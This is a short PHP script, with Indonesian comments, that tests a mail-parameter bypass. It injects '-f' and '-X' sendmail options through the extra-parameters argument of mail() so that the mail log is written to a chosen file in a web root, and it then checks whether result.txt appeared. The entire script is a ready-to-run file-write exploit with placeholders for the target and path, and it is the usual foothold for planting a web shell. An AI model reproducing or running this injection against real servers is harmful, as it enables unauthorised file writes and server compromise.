<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

echo "--- MAIL PARAMETER BYPASS ---<br>";

$encoded_target = "xxx"; // your base64 email encoded 
$target = base64_decode($encoded_target);

$p1 = "-f";
$p2 = " -X";
$p3 = "/www/wwwroot/blablabla/result.txt"; // ganti folder tujuan results.txt

echo "Target decoded: " . htmlspecialchars($target) . "<br>";
echo "Mencoba mengirim mail...<br>";

$subject = "Pentest";
$body    = "Test Bypass";
$headers = "From: webmaster@websitenyaapa.com";
$extra   = $p1 . $target . $p2 . $p3;

if (mail($target, $subject, $body, $headers, $extra)) {
    echo "Fungsi mail() berhasil dieksekusi.<br>";
    echo "Cek apakah file 'result.txt' muncul di folder upload.<br>";
} else {
    echo "Fungsi mail() gagal. Parameter tambahan mungkin diblokir server.<br>";
}

echo "--- SELESAI ---<br>";
?>
